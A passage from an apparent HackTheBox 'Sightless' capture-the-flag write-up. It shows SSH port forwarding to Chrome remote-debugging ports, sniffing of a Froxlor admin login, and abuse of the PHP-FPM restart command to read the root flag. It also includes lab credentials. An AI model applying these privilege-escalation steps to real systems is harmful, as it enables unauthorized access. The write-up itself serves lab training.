+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">michael@sightless:~$ netstat -anot</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer</span><br><span class="line">tcp        0      0 127.0.0.1:33011         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:43425         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:37621         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:42634         127.0.0.1:37621         ESTABLISHED off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:53488         ESTABLISHED keepalive (7194.60/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:56136         TIME_WAIT   timewait (13.28/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:43552         TIME_WAIT   timewait (54.60/0/0)</span><br><span class="line">tcp        0    232 10.129.231.103:22       10.10.x.x:30607        ESTABLISHED on (0.32/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:50152         127.0.0.1:43425         ESTABLISHED keepalive (28.62/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:43425         127.0.0.1:50152         ESTABLISHED keepalive (28.62/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:53492         127.0.0.1:8080          TIME_WAIT   timewait (55.57/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:37621         127.0.0.1:42634         ESTABLISHED keepalive (24.28/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:35154         TIME_WAIT   timewait (39.10/0/0)</span><br><span class="line">tcp        0      1 10.129.231.103:46100    8.8.8.8:53              SYN_SENT    on (1.39/1/0)</span><br><span class="line">tcp        0      0 127.0.0.1:53488         127.0.0.1:8080          ESTABLISHED keepalive (39.60/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:50154         127.0.0.1:43425         ESTABLISHED keepalive (8.83/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:35014         TIME_WAIT   timewait (8.02/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:8080          127.0.0.1:34976         TIME_WAIT   timewait (23.62/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:43425         127.0.0.1:50154         ESTABLISHED keepalive (8.88/0/0)</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::21                   :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">michael@sightless:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that Froxlor is running on port 8080 (we already saw on the first website).<br>But we could also see that the machine is utilizing Chrome Drivers, that’s what made me think of <a class="link"   target="_blank" rel="noopener" href="https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/" >this article  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>What we’ll do now is forward the 8080 port alongside any other weird-looking port (except 2-digit ports), because those are the ports used by the chrome driver:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; ssh  -L 8080:sightless.htb:8080 -L 42634:sightless.htb:42634 -L 34956:localhost:34956 -L 50152:localhost:50152 -L 43425:localhost:43425 -L 37621:localhost:37621 -L 50154:localhost:50154 -L 43425:localhost:43425 michael@sightless.htb</span><br><span class="line">michael@sightless.htb<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">bind [127.0.0.1]:42634: Permission denied</span></span><br><span class="line"><span class="string">channel_setup_fwd_listener_tcpip: cannot listen to port: 42634</span></span><br><span class="line"><span class="string">bind [127.0.0.1]:43425: Permission denied</span></span><br><span class="line"><span class="string">channel_setup_fwd_listener_tcpip: cannot listen to port: 43425</span></span><br><span class="line"><span class="string">Last login: Sat Jan 11 10:20:21 2025 from 10.10.x.x</span></span><br><span class="line"><span class="string">michael@sightless:~$</span></span><br></pre></td></tr></table></figure></div>
+<p>(ports change so make sure to update them)<br>Next, we’ll open Google Chrome and navigate to <code>chrome://inspect/#devices</code>. Add each port as localhost:<port_number> in the Configure tab until we see a connection appear. Then click on “Inspect” to open a new window where we switch to the “Network” tab and wait for Michael to log in and monitor the traffic.<br>In index.php we’ll find the credentials required to access the login portal on localhost:8080:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/froxlor.png"
+                      alt="Froxlor"
+                ><figcaption>Froxlor</figcaption></figure></p>
+<p><code>admin:ForlorfroxAdmin</code></p>
+<p>And we’re in:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/froxlor2.png"
+                      alt="Froxlor"
+                ><figcaption>Froxlor</figcaption></figure></p>
+<h4 id="RCE-to-root-using-the-PHP-FPM-package"><a href="#RCE-to-root-using-the-PHP-FPM-package" class="headerlink" title="RCE to root using the PHP-FPM package"></a>RCE to root using the PHP-FPM package</h4><p>Checking the PHP packages we see that there’s a package restart command that we’re able to alter:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/froxlor3.png"
+                      alt="Froxlor"
+                ><figcaption>Froxlor</figcaption></figure></p>
+<p>Let’s copy our root flag to &#x2F;tmp and change it’s permissions. Everytime we change the command we should disable it and re-enable it from <code>http://admin.sightless.htb:8080/admin_settings.php?page=overview&amp;part=phpfpm</code>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/froxlor4.png"
+                      alt="Froxlor"
+                ><figcaption>Froxlor</figcaption></figure></p>
+<p>Then disable and enable again:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Sightless/froxlor5.png"
+                      alt="Froxlor"
+                ><figcaption>Froxlor</figcaption></figure></p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">michael@sightless:~$ <span class="built_in">ls</span> /tmp</span><br><span class="line">Crashpad</span><br><span class="line">root.txt</span><br><span class="line">systemd-private-b0a4883901934c469b86c2105ddc6b4d-apache2.service-LPF8fp</span><br><span class="line">systemd-private-b0a4883901934c469b86c2105ddc6b4d-ModemManager.service-CnBX3D</span><br><span class="line">systemd-private-b0a4883901934c469b86c2105ddc6b4d-systemd-logind.service-NqNnkU</span><br><span class="line">systemd-private-b0a4883901934c469b86c2105ddc6b4d-systemd-resolved.service-PJrWDg</span><br><span class="line">systemd-private-b0a4883901934c469b86c2105ddc6b4d-systemd-timesyncd.service-AUiPUV</span><br><span class="line">vmware-root_790-2965972456</span><br><span class="line">michael@sightless:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>Do the same thing to add <code>read</code> permissions to it, and get our root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">michael@sightless:/tmp$ <span class="built_in">cat</span> root.txt</span><br><span class="line">98109e1ce28830******************</span><br><span class="line">michael@sightless:/tmp$</span><br></pre></td></tr></table></figure></div>
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: Sightless</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2025-01-11 09:56:11</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-01-11 11:45:44
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2025/01/11/Hackthebox-Sightless/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/12/27/Certified-Azure-Red-Team-Professional-CARTP-Review-%F0%9F%9A%80/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Certified Azure Red Team Professional (CARTP) - Review 🚀</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Sightless</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-sightless-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;sightless.htb </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#User-Pivoting-Michael"><span class="nav-text">User Pivoting - Michael</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-Chrome-Remote-Debugger-to-RCE"><span class="nav-text">Privilege Escalation - Chrome Remote Debugger to RCE</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
